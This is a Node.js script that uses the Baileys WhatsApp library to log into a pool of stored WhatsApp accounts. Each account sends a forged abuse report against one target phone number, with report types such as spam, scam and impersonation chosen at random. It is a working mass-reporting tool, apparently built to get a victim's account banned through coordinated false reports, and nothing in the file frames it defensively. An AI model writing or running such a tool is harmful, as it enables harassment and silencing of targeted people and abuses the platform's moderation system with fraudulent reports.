const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const pino = require('pino');

const TARGET = process.argv[2];
const POOL   = process.argv[3] || './sessions';
const CONC   = parseInt(process.argv[4] || '10');
const REPORT_TYPES = ['spam', 'abuse', 'impersonation', 'scam'];

if (!TARGET) { process.exit(1); }
const targetJid = `${TARGET.replace(/[^\d]/g, '')}@s.whatsapp.net`;
const logger = pino({ level: 'silent' });

const sessions = fs.existsSync(POOL) ? fs.readdirSync(POOL).filter(d => fs.existsSync(path.join(POOL, d, 'creds.json'))) : [];
if (sessions.length === 0) { console.log('No sessions found in ./sessions'); process.exit(1); }

function buildReportNode(type) {
  return {
    tag: 'iq', attrs: { type: 'set', to: 's.whatsapp.net', xmlns: 'spam' },
    content: [{ tag: 'report', attrs: { jid: targetJid, type, spam_flow: '2' } }],
  };
}

async function fireOne(label) {
  const dir = path.join(POOL, label);
  const { state, saveCreds } = await useMultiFileAuthState(dir);
  const { version } = await fetchLatestBaileysVersion();
  const sock = makeWASocket({ version, logger, auth: state, printQRInTerminal: false, syncFullHistory: false });

  sock.ev.on('creds.update', saveCreds);

  return new Promise((resolve) => {
    let done = false;
    const finish = (result) => { if (done) return; done = true; try { sock.end(undefined); } catch {} resolve(result); };

    sock.ev.on('connection.update', async (u) => {
      if (u.connection === 'open') {
        try {
          const type = REPORT_TYPES[Math.floor(Math.random() * REPORT_TYPES.length)];
          await sock.query(buildReportNode(type));
          console.log(`[+] ${label} type=${type} -> ok`);
          finish({ ok: true });
        } catch (e) { finish({ ok: false }); }
      } else if (u.connection === 'close') {
         finish({ ok: false });
      }
    });
    setTimeout(() => { if (!done) finish({ ok: false }); }, 20000);
  });
}

async function main() {
  const queue = [...sessions];
  async function worker() {
    while (queue.length) {
      const label = queue.shift();
      await fireOne(label);
      await new Promise(r => setTimeout(r, 500));
    }
  }
  await Promise.all(Array.from({ length: Math.min(CONC, sessions.length) }, worker));
  console.log(`[done] Process completed.`);
}

main().catch(console.error);
